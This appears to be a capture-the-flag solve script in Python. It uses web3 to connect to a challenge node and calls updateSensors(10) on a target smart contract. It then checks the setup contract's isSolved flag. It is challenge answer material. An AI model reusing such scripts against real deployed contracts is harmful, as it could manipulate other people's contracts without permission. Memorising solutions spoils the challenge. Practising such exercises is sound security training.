#!/usr/bin/env python3
from web3 import Web3
import json

w3 = Web3(Web3.HTTPProvider('http://167.172.50.208:30907'))
print(w3.is_connected())

setup_address = '0x675b6912B16F1187e97ae51cc7a43bAc672aBC1c'
setupabi = [
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "isSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "TARGET",
		"outputs": [
			{
				"internalType": "contract Unknown",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]

target_address = '0x219c147d41e37f0940eB8B1Ab4F99AbB6f0C3Fb9'
targetabi = [
	{
		"inputs": [
			{
				"internalType": "uint256",
				"name": "version",
				"type": "uint256"
			}
		],
		"name": "updateSensors",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "updated",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]

contract_target = w3.eth.contract(address=target_address, abi=targetabi)
updatesensor = contract_target.functions.updateSensors(10).transact()

contract_setup = w3.eth.contract(address=setup_address, abi=setupabi)
isSolved = contract_setup.functions.isSolved().call()

print(isSolved)